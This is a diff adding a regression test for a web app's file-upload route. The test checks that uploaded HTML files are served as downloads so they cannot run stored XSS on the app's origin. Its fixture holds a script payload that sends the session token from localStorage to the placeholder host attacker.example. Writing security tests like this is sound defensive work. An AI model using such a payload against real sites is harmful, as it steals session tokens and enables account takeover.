@@ -8466,6 +8466,69 @@ test("uploading a file for a 'file' field stores it on disk, serves it back at t
 });
 
 /**
+ * Regression test for a stored-XSS/session-theft hole: nothing restricts
+ * what content type a file-type field's upload can be, and EntityPanel.tsx
+ * opens every uploaded file through a plain <a href> on this app's own
+ * origin -- so an uploaded .html file whose body is a <script> would run
+ * with access to this app's own localStorage session token the moment any
+ * other collaborator (e.g. the project owner, viewing a malicious
+ * collaborator's own record) opened its link. app.ts's /api/uploads static
+ * route must serve every uploaded file as an attachment (forcing a
+ * download instead of an inline render) so this can never execute,
+ * regardless of what content type was uploaded.
+ */
+test("GET /api/uploads/... serves an uploaded .html file with Content-Disposition: attachment, so it can never execute as a page on this app's own origin", async () => {
+  await withServer(async (baseUrl, db) => {
+    const email = `upload-html-${randomUUID()}@example.com`;
+    const token = await signup(baseUrl, email);
+    const user = findUserByEmail(db, email)!;
+
+    const spec: ProductSpec = {
+      summary: "test",
+      personas: [],
+      roles: ["Admin"],
+      entities: [
+        {
+          name: "Applicant",
+          fields: [
+            { name: "name", type: "text", required: true },
+            { name: "resume", type: "file", required: false },
+          ],
+        },
+      ],
+      screens: [],
+      assumptions: [],
+      openQuestions: [],
+    };
+    const projectId = randomUUID();
+    insertProject(db, { id: projectId, ownerId: user.id, name: "Hiring", description: "test", spec });
+    diffAndMigrate(db, projectId, undefined, spec);
+    markProjectBuilt(db, projectId);
+
+    const maliciousBody = "<script>fetch('https://attacker.example/steal?t='+localStorage.getItem('forge.token'))</script>";
+    const formData = new FormData();
+    formData.append("file", new File([maliciousBody], "resume.html", { type: "text/html" }));
+    const uploadRes = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Applicant/fields/resume/upload`, {
+      method: "POST",
+      headers: { authorization: `Bearer ${token}` },
+      body: formData,
+    });
+    assert.equal(uploadRes.status, 200);
+    const uploadBody = (await uploadRes.json()) as { file: { url: string } };
+
+    const servedRes = await fetch(`${baseUrl}${uploadBody.file.url}`);
+    assert.equal(servedRes.status, 200);
+    assert.equal(await servedRes.text(), maliciousBody, "the file's own content is unaffected -- only how it's served must change");
+    assert.equal(
+      servedRes.headers.get("content-disposition"),
+      "attachment",
+      "an uploaded file must be forced to download, never rendered inline, regardless of its content type",
+    );
+    assert.equal(servedRes.headers.get("x-content-type-options"), "nosniff");
+  });
+});
+
+/**
  * Regression test for a real disk-space leak: deleteProject (packages/db)
  * drops every data table, checkpoint, and collaborator grant, but it's a
  * pure DB-layer function with no filesystem access at all -- every file
